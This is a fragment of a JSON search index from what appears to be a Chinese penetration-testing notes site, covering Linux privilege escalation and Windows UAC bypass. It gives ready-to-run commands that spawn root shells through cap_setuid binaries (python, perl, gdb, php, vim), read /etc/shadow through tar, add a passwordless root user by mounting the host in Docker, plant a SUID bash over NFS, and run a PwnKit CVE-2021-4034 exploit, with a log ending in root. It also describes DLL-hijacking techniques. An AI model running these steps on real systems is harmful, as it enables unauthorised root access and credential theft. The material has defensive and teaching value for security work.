\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6307\u5b9a\u5173\u952e\u5b57\uff0c\u5728\u6240\u6709\u6587\u4ef6\u4e2d\u641c\u7d22\u5185\u5bb9\u4e2d\u6709\u5173\u952e\u5b57\u7684\u6587\u4ef6\u3002","title":"\u6587\u4ef6\u5185\u67e5\u627e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_14","text":"find / -mmin -10 2>/dev/null | grep -Ev \"^/proc\" (\u4e0d\u663e\u793a^/proc\u6587\u4ef6\u6216\u6587\u4ef6\u5939)","title":"\u67e5\u627e\u5341\u5206\u949f\u5185\u66f4\u6539\u8fc7\u7684\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#capabilities","text":"capabilities \u662flinux2.2\u540e\u51fa\u73b0\u7684\u4ea7\u7269\uff0c\u5b83\u7684\u51fa\u73b0\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5f25\u8865\u4e86suid\u8fd9\u79cd\u7c97\u7cd9\u7684\u6743\u9650\u7ba1\u7406\u673a\u5236\uff0c\u4f46\u662fcapabilities \u81ea\u8eab\u4e5f\u6709\u9020\u6210\u63d0\u6743\u7684\u5b89\u5168\u9690\u60a3","title":"capabilities"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_15","text":"capabilities \u628aroot\u7684\u6743\u9650\u7ec6\u5206\u4e86\uff0c\u53ef\u4ee5\u5206\u522b\u542f\u7528\u6216\u8005\u7981\u7528\u3002 \u5728\u8fdb\u884c\u7279\u6743\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u5982\u679ceuid\u4e0d\u662froot\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u68c0\u67e5\u662f\u5426\u5177\u6709\u6267\u884c\u7279\u6743\u64cd\u4f5c\u7684\u5bf9\u5e94capabilities \uff0c\u5e76\u4ee5\u6b64\u4e3a\u51ed\u636e\u51b3\u5b9a\u7279\u6743\u64cd\u4f5c\u662f\u5426\u80fd\u88ab\u6267\u884c\u3002 \u5982\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u7279\u6743\u64cd\u4f5c\u53ca\u5176\u5bf9\u5e94capabilities \u6539\u53d8\u6587\u4ef6\u7684\u6240\u5c5e\u8005(chown()) CAP_CHOWN \u5411\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7(kill(), signal()) CAP_KILL \u6539\u53d8\u8fdb\u7a0b\u7684uid(setuid(), setreuid(), setresuid()\u7b49) CAP_SETUID trace\u8fdb\u7a0b(ptrace()) CAP_SYS_PTRACE \u8bbe\u7f6e\u7cfb\u7edf\u65f6\u95f4(settimeofday(), stime()\u7b49) CAP_SYS_TIME \u5ffd\u7565\u6587\u4ef6\u8bfb\u53ca\u76ee\u5f55\u641c\u7d22\u7684DAC\u8bbf\u95ee\u9650\u5236 CAP_DAC_READ_SEARCH \u5173\u4e8ecapabilities\u7684\u7ba1\u7406\u5de5\u5177\u6709\u5982\u4e0b: getcap setcap capsh filecap getcap \u7528\u4e8e\u67e5\u8be2capabilities\uff0csetcap\u7528\u4e8e\u8bbe\u7f6ecapabilities\uff0ccapsh\u7528\u4e8e\u67e5\u5f53\u524dshell\u8fdb\u7a0b\u7684capabilities\uff0cfilecap\u65e2\u80fd\u8bbe\u7f6e\u53c8\u80fd\u67e5\u8be2\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6307\u4ee4\u641c\u7d22\u8bbe\u7f6e\u4e86capabilities\u7684\u53ef\u6267\u884c\u6587\u4ef6 getcap -r / 2>/dev/null","title":"\u7b80\u4ecb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#_16","text":"","title":"\u5b9e\u64cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#cap_setuid","text":"cap_setuid \u53ef\u4ee5\u8bbe\u7f6e\u5f53\u524d\u7528\u6237\u7684euid\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6b64\u9009\u9879\u6765\u8fdb\u884c\u4e00\u4e9b\u63d0\u6743\u3002 \u4ee5python\u4e3a\u4f8b \u6211\u4eec\u53d1\u73b0python3.8 \u6709cap_setuid\u6743\u9650\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528\u4ee5\u4e0b\u6307\u4ee4\u8fdb\u884c\u63d0\u6743 python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' \u7c7b\u4f3c\u7684\u6709\u5f88\u591a\u3002 perl perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' gdb gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit php php -r \"posix_setuid(0); system('/bin/sh');\" python python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' rvim \u9700\u8981\u652f\u6301python3\u6a21\u5757\u3002 rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' vim \u9700\u8981\u652f\u6301python3\u6a21\u5757\u3002 vim --version \u67e5\u8be2\uff0c\u662f\u5426\u652f\u6301py3 vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'","title":"\u901a\u8fc7cap_setuid"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#cap_dac_read_search","text":"cap_dac_read_search\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u7684\u8bfb\u6743\u9650\u68c0\u67e5\u4ee5\u53ca\u76ee\u5f55\u7684\u8bfb/\u6267\u884c\u6743\u9650\u7684\u68c0\u67e5\u3002 \u5229\u7528\u6b64\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u4e2d\u7684\u654f\u611f\u4fe1\u606f\u3002 \u5982\u679ctar\u6709\u6b64\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6b64\u6765\u67e5\u770b\u654f\u611f\u6587\u4ef6\u5185\u5bb9\u3002 tar cvf shadow.tar /etc/shadow //\u521b\u5efa\u538b\u7f29\u6587\u4ef6 tar -xvf shadow.tar //\u89e3\u538b\u7f29 cd etc //\u8fdb\u5165\u89e3\u538b\u7f29\u7684\u76ee\u5f55 chmod +r shadow //\u8d4b\u4e88\u8bfb\u6743\u9650 cat shadow | grep root //\u67e5\u770bshadow\u6587\u4ef6\u7684\u5185\u5bb9","title":"\u901a\u8fc7CAP_DAC_READ_SEARCH"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#docker","text":"","title":"Docker"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#docker_1","text":"\u5982\u679c\u6211\u4eec\u62ff\u5230\u4e86\u4e00\u4e2aDocker\u7528\u6237\u7ec4\u7684\u7528\u6237\u6743\u9650\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u5730\u5b8c\u6210\u63d0\u6743 \u9996\u5148\u6211\u4eec\u6267\u884c\u5982\u4e0b\u547d\u4ee4 docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh \u7136\u540e\u5728\u5176\u4e2d\u7684/etc/passwd\u4e2d\u5199\u5165\u4e00\u4e2aroot\u6743\u9650\u7528\u6237\uff08\u6211\u8fd9\u91cc\u76f4\u63a5\u65e0\u5bc6\u7801\u4e86\uff09 \u7136\u540e\u9000\u51fa\u6765\uff0c\u76f4\u63a5\u5c1d\u8bd5 su root2 \u63d0\u6743\u6210\u529f","title":"Docker\u7528\u6237\u7ec4\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#nfs","text":"NFS \u662f\u4e00\u4e2a\u7528\u6765\u5171\u4eab\u76ee\u5f55\u7684\u4e1c\u897f\uff0c\u4f46\u82e5\u914d\u7f6e\u6743\u9650\u4e0d\u5f53\u5219\u4f1a\u5f15\u53d1\u5b89\u5168\u95ee\u9898","title":"NFS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#no_root_squash","text":"\u6211\u4eeccat /etc/exports \u5982\u679c\u6709no_root_squash\u5b57\u6837\uff0c\u5219\u8bf4\u660eroot\u7528\u6237\u5c31\u4f1a\u5bf9\u5171\u4eab\u76ee\u5f55\u62e5\u6709\u81f3\u9ad8\u7684\u6743\u9650\u63a7\u5236\uff0c\u5c31\u50cf\u662f\u5bf9\u672c\u673a\u7684\u76ee\u5f55\u64cd\u4f5c\u4e00\u6837\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u4efb\u4f55\u673a\u5668\u7684root\u5728\u6b64\u76ee\u5f55\u4e0a\u90fd\u6709\u6700\u9ad8\u6743\u9650\u3002 \u6211\u4eec\u5728\u83b7\u5f97\u4e00\u53f0\u673a\u5668\u7684root\u6743\u9650\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7nfs\u5728\u53e6\u4e00\u53f0\u4f4e\u6743\u9650\u673a\u5668\u4e0a\u5b9e\u73b0\u63d0\u6743 mkdir /tmp/nfs mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs \u5c06\u672c\u673a\u4e0a\u7684/tmp/nfs \u6302\u8f7d\u5230\u5171\u4eab\u76ee\u5f55 cp /bin/bash /tmp/nfs/bash chmod u+s /tmp/nfs/bash \u8bbe\u7f6e\u5171\u4eab\u76ee\u5f55\u4e0abash\u7684suid \u56de\u5230\u4f4e\u6743\u9650\u673a\uff0c\u6267\u884c /tmp/bash \u5b8c\u6210\u63d0\u6743","title":"no_root_squash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/#pkexec-cve-2021-4034","text":"polkit\u662f\u4e00\u4e2a\u6388\u6743\u7ba1\u7406\u5668\uff0c\u5176\u7cfb\u7edf\u67b6\u6784\u7531\u6388\u6743\u548c\u8eab\u4efd\u9a8c\u8bc1\u4ee3\u7406\u7ec4\u6210\uff0cpkexec\u662f\u5176\u4e2dpolkit\u7684\u5176\u4e2d\u4e00\u4e2a\u5de5\u5177\uff0c\u4ed6\u7684\u4f5c\u7528\u6709\u70b9\u7c7b\u4f3c\u4e8esudo\uff0c\u5141\u8bb8\u7528\u6237\u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4 https://github.com/luijait/PwnKit-Exploit.git debian@debian:~/PwnKit-Exploit$ make cc -Wall exploit.c -o exploit debian@debian:~/PwnKit-Exploit$ whoami debian debian@debian:~/PwnKit-Exploit$ ./exploit Current User before execute exploit hacker@victim$whoami: debian Exploit written by @luijait (0x6c75696a616974) [+] Enjoy your root if exploit was completed succesfully root@debian:/home/debian/PwnKit-Exploit# whoami root root@debian:/home/debian/PwnKit-Exploit# \u4e0d\u53d7\u5f71\u54cd\u7684\u7248\u672c CentOS\uff1a \u00b7 CentOS 6\uff1apolkit-0.96-11.el6_10.2 \u00b7 CentOS 7\uff1apolkit-0.112-26.el7_9.1 \u00b7 CentOS 8.0\uff1apolkit-0.115-13.el8_5.1 \u00b7 CentOS 8.2\uff1apolkit-0.115-11.el8_2.2 \u00b7 CentOS 8.4\uff1apolkit-0.115-11.el8_4.2 Ubuntu\uff1a \u00b7 Ubuntu 14.04 ESM\uff1apolicykit-1-0.105-4ubuntu3.14.04.6+esm1 \u00b7 Ubuntu 16.04 ESM\uff1apolicykit-1-0.105-14.1ubuntu0.5+esm1 \u00b7 Ubuntu 18.04 LTS\uff1apolicykit-1-0.105-20ubuntu0.18.04.6 \u00b7 Ubuntu 20.04 LTS\uff1apolicykit-1-0.105-26ubuntu1.2 \u00b7 Ubuntu 21.10\uff1apolicykit-1-0.105-31ubuntu0.1 Debain\uff1a \u00b7 \uff1apolicykit-1 0.105-18+deb9u2 \u00b7 Debain stretch\uff1apolicykit-1 0.105-18+deb9u2 \u00b7 Debain buster\uff1apolicykit-1 0.105-25+deb10u1 \u00b7 Debain bullseye\uff1apolicykit-1 0.105-31+deb11u1 \u00b7 Debain bookworm,bullseye\uff1apolicykit-1 0.105-31.1","title":"pkexec \u63d0\u6743CVE-2021-4034"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/","text":"Windows\u63d0\u6743 Windows\u63d0\u6743 Bypass UAC Windows\u4e0b\u53ef\u63d0\u6743\u7684\u4e5d\u79cd\u6743\u9650 \u65b0\u9875\u9762","title":"Windows\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#windows","text":"Windows\u63d0\u6743 Bypass UAC Windows\u4e0b\u53ef\u63d0\u6743\u7684\u4e5d\u79cd\u6743\u9650 \u65b0\u9875\u9762","title":"Windows\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/","text":"Bypass UAC \u76ee\u5f55 UAC autoElevate\u4e0erequestedExecutionLevel autoElevate requestedExecutionLevel \u767d\u540d\u5355\u7a0b\u5e8f DLL\u52ab\u6301 \u5b9e\u8df5\u51fa\u771f\u77e51 \u5b9e\u8df5\u51fa\u771f\u77e52 CLR\u52a0\u8f7d\u4efb\u610fDLL \u767d\u540d\u5355\u7a0b\u5e8f odbcad32.exe \u7ba1\u7406\u5de5\u5177 \u6ce8\u518c\u8868\u52ab\u6301 Fodhelper.exe sdclt eventvmr COM\u52ab\u6301 \u5229\u7528com\u63a5\u53e3 ICMLuaUtil UACME windbg\u8c03\u8bd5 UAC \u7528\u6237\u5e10\u6237\u63a7\u5236\uff08User Account Control\uff0c\u7b80\u5199\u4f5cUAC)\u662f \u5fae\u8f6f \u516c\u53f8\u5728\u5176[Windows Vista]( https://baike.baidu.com/item/Windows Vista)\u53ca\u66f4\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u91c7\u7528\u7684\u4e00\u79cd\u63a7\u5236\u673a\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u8fdb\u884c\u4e0d\u5fc5\u8981\u7684\u66f4\u6539\uff0c\u63d0\u5347\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u548c\u5b89\u5168\u6027\u3002 \u7ba1\u7406\u5458\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\u662f\u4ee5\u4f4e\u6743\u9650\u8fd0\u884c\u4efb\u52a1\u7684\uff0c\u8fd9\u4e2a\u72b6\u6001\u88ab\u79f0\u4e3a\u88ab\u4fdd\u62a4\u7684\u7ba1\u7406\u5458\u3002\u4f46\u5f53\u7ba1\u7406\u5458\u8981\u6267\u884c\u9ad8\u98ce\u9669\u64cd\u4f5c\uff08\u5982\u5b89\u88c5\u7a0b\u5e8f\u7b49\uff09\uff0c\u5c31\u9700\u8981\u63d0\u5347\u6743\u9650\u53bb\u5b8c\u6210\u8fd9\u4e9b\u4efb\u52a1\u3002\u8fd9\u4e2a\u63d0\u5347\u6743\u9650\u7684\u8fc7\u7a0b\u901a\u5e38\u662f\u8fd9\u6837\u7684\uff0c\u76f8\u4fe1\u5404\u4f4d\u90fd\u773c\u719f\u8fc7\u3002 \u70b9\u51fb\u201c\u662f\u201d\uff0c\u7ba1\u7406\u5458\u5c31\u4f1a\u63d0\u5347\u5230\u9ad8\u6743\u9650\u518d\u53bb\u8fd0\u884c\u8be5\u4efb\u52a1\u3002 autoElevate\u4e0erequestedExecutionLevel autoElevate \u5f53\u67d0\u4e2aEXE\u6587\u4ef6\u7684\u6587\u4ef6\u6e05\u5355\u91cc\u6709\\ \u5143\u7d20\u65f6\uff0c\u5f53\u6267\u884c\u8be5\u6587\u4ef6\u65f6\u4f1a\u9ed8\u8ba4\u63d0\u6743\u6267\u884c\u3002 \u6211\u4eec\u52ab\u6301\u8be5exe\u6587\u4ef6\u7684dll\uff0c\u53ef\u4ee5\u8fbe\u5230Bypass UAC\u63d0\u6743\u7684\u76ee\u7684\u3002 \u9002\u7528\u8303\u56f4:\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u83b7\u5f97\uff0c\u8981\u5f97\u5230\u9ad8\u6743\u9650\u7ba1\u7406\u5458\u6743\u9650 \u4e00\u822c\u7528\u5de5\u5177sigcheck\u68c0\u6d4b \u7f51\u4e0a\u5e38\u62ffC:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe \u4e3e\u5217\u5b50 \u8fd9\u4e2a\u4e1c\u897f\u5f88\u6709\u7528\uff0c\u662f\u4e0b\u9762\u90e8\u5206\u65b9\u6cd5\u7684\u524d\u63d0\u6761\u4ef6 requestedExecutionLevel \u6709\u4e09\u4e2a\u4e0d\u540c\u7684\u53c2\u6570\uff1aasInvoker requireAdministrator highestAvailable \u5206\u522b\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u4ee5\u4ec0\u4e48\u6743\u9650\u8fd0\u884c asInvoker\uff1a\u7236\u8fdb\u7a0b\u662f\u4ec0\u4e48\u6743\u9650\uff0c\u6b64\u5e94\u7528\u7a0b\u5e8f\u5c31\u662f\u4ec0\u4e48\u6743\u9650 requireAdministrator\uff1a\u9700\u8981\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u6765\u8fd0\u884c\uff0c\u6b64\u7c7b\u5e94\u7528\u7a0b\u5e8f\u56fe\u6807\u53f3\u4e0b\u65b9\u4f1a\u6709\u4e2a\u76fe\u724c\u6807\u8bb0 highestAvailable\uff1a\u6b64\u7a0b\u5e8f\u4ee5\u5f53\u524d\u7528\u6237\u80fd\u83b7\u53d6\u5230\u7684\u6700\u9ad8\u6743\u9650\u8fd0\u884c\u3002\u5f53\u4f60\u5728\u7ba1\u7406\u5458\u8d26\u6237\u4e0b\u8fd0\u884c\u6b64\u7a0b\u5e8f\u5c31\u4f1a\u8981\u6c42\u6743\u9650\u63d0\u5347\u4ee5\u53ca\u5f39\u51faUAC\u6846\u3002\u5f53\u4f60\u5728\u6807\u51c6\u8d26\u6237\u4e0b\u8fd0\u884c\u6b64\u7a0b\u5e8f\uff0c\u7531\u4e8e\u6b64\u8d26\u6237\u7684\u6700\u9ad8\u6743\u9650\u5c31\u662f\u6807\u51c6\u8d26\u6237\uff0c\u6240\u4ee5\u53cc\u51fb\u4fbf\u8fd0\u884c \u767d\u540d\u5355\u7a0b\u5e8f \u9664\u4e86\u521a\u521a\u8bf4\u7684autoelevate\uff0c\u8fd8\u6709\u4e00\u7c7b\u53eb\u767d\u540d\u5355\u7a0b\u5e8f\u7684\u5e94\u7528\u7a0b\u5e8f\u4e5f\u662f\u6253\u5f00\u9ed8\u8ba4\u63d0\u6743\u7684\u3002\u5982\u670d\u52a1\u7ba1\u7406\u5de5\u5177\u4e0b\u7684\u8bb8\u591a\u5e94\u7528\u90fd\u5c5e\u4e8e\u767d\u540d\u5355\u7a0b\u5e8f\uff0c\u800c\u5176\u4e2d\u53c8\u6709\u4e9b\u7a0b\u5e8f\u6267\u884c\u65f6\u9700\u8981\u4f9d\u8d56CLR\u652f\u6301\uff08\u5982\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\uff09 DLL\u52ab\u6301 reference: https://www.anquanke.com/post/id/209033 https://www.cnblogs.com/0daybug/p/11719541.html exe\u6587\u4ef6\u8fd0\u884c\u65f6\u4f1a\u52a0\u8f7d\u8bb8\u591adll\u6587\u4ef6\uff0c\u8fd9\u4e9bdll\u6587\u4ef6\u7684\u52a0\u8f7d\u987a\u5e8f\u662f \u7a0b\u5e8f\u6240\u5728\u76ee\u5f55 \u7cfb\u7edf\u76ee\u5f55\u5373 SYSTEM32 \u76ee\u5f55 16\u4f4d\u7cfb\u7edf\u76ee\u5f55\u5373 SYSTEM \u76ee\u5f55 Windows \u76ee\u5f55 \u7a0b\u5e8f\u52a0\u8f7d\u76ee\u5f55( SetCurrentDirecctory ) PATH \u73af\u5883\u53d8\u91cf\u4e2d\u5217\u51fa\u7684\u76ee\u5f55 \u540c\u65f6\uff0cdll\u52a0\u8f7d\u4e5f\u9075\u5faa\u7740 Know DLLs\u6ce8\u518c\u8868\u9879 \u7684\u673a\u5236\uff1aKnow DLLs\u6ce8\u518c\u8868\u9879\u6307\u5b9a\u7684DLL\u662f\u5df2\u7ecf\u88ab\u64cd\u4f5c\u7cfb\u7edf\u52a0\u8f7d\u8fc7\u540e\u7684DLL\uff0c\u4e0d\u4f1a\u88ab\u5e94\u7528\u7a0b\u5e8f\u641c\u7d22\u5e76\u52a0\u8f7d\u3002\u5728\u6ce8\u518c\u8868HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLS\u5904\u53ef\u4ee5\u770b\u89c1\u8fd9\u4e9bdll \u5728knowdlls\u8868\u9879\u4e2d\u7684dll\u662f\u9884\u5148\u5c31\u52a0\u8f7d\u8fdb\u5185\u5b58\u7a7a\u95f4\u7684\uff0c\u88ab\u8bf8\u591a\u5e94\u7528\u8c03\u7528\u7740\uff0c\u6539\u52a8\u9700\u8981\u9ad8\u6743\u9650\u3002 \u5982\u679c\u6211\u4eec\u5728\u5e94\u7528\u7a0b\u5e8f\u627e\u5230\u6b63\u786e\u7684dll\u4e4b\u524d\uff0c\u5c06\u6211\u4eec\u81ea\u5df1\u521b\u9020\u7684dll\u653e\u5165\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u641c\u7d22\u76ee\u5f55\u8ba9\u5e94\u7528\u7a0b\u5e8f\u4f18\u5148\u52a0\u8f7d\u6b64dll\u6587\u4ef6\uff0c\u8fd9\u5c31\u9020\u6210\u4e86dll\u52ab\u6301\u3002\u4f46\u8fd9\u53ea\u662fdll\u52ab\u6301\u7684\u5176\u4e2d\u4e00\u79cd\u9014\u5f84\uff0c\u4ed6\u6709\u8fd9\u4e9b\u9014\u5f84\uff1a \uff081\uff09 DLL\u66ff\u6362\uff1a\u7528\u6076\u610f\u7684DLL\u66ff\u6362\u6389\u5408\u6cd5\u7684DLL \uff082\uff09 DLL\u641c\u7d22\u987a\u5e8f\u52ab\u6301\uff1a\u5f53\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7dDLL\u7684\u65f6\u5019\uff0c\u5982\u679c\u6ca1\u6709\u5e26\u6307\u5b9aDLL\u7684\u8def\u5f84\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u4f1a\u4ee5\u7279\u5b9a\u7684\u987a\u5e8f\u4f9d\u6b21\u5728\u6307\u5b9a\u7684\u8def\u5f84\u4e0b\u641c\u7d22\u5f85\u52a0\u8f7d\u7684DLL\u3002\u901a\u8fc7\u5c06\u6076\u610fDLL\u653e\u5728\u771f\u5b9eDLL\u4e4b\u524d\u7684\u641c\u7d22\u4f4d\u7f6e\uff0c\u5c31\u53ef\u4ee5\u52ab\u6301\u641c\u7d22\u987a\u5e8f\uff0c\u52ab\u6301\u7684\u76ee\u5f55\u6709\u65f6\u5019\u5305\u62ec\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 \uff083\uff09 \u865a\u62dfDLL\u52ab\u6301\uff1a\u91ca\u653e\u4e00\u4e2a\u6076\u610f\u7684DLL\u6765\u4ee3\u66ff\u5408\u6cd5\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7d\u7684\u4e22\u5931/\u4e0d\u5b58\u5728\u7684DLL \uff084\uff09 DLL\u91cd\u5b9a\u5411\uff1a\u66f4\u6539DLL\u641c\u7d22\u7684\u8def\u5f84\uff0c\u6bd4\u5982\u901a\u8fc7\u7f16\u8f91%PATH%\u73af\u5883\u53d8\u91cf\u6216 .exe.manifest/.exe.local\u6587\u4ef6\u4ee5\u5c06\u641c\u7d22\u8def\u5f84\u5b9a\u4f4d\u5230\u5305\u542b\u6076\u610fDLL\u7684\u5730\u65b9\u3002 \uff085\uff09 WinSxS DLL\u66ff\u6362\uff1a\u5c06\u76ee\u6807DLL\u76f8\u5173\u7684WinSxS\u6587\u4ef6\u5939\u4e2d\u7684\u6076\u610fDLL\u66ff\u6362\u4e3a\u5408\u6cd5\u7684DLL\u3002\u6b64\u65b9\u6cd5\u901a\u5e38\u4e5f\u88ab\u79f0\u4e3aDLL\u4fa7\u52a0\u8f7d \uff086\uff09 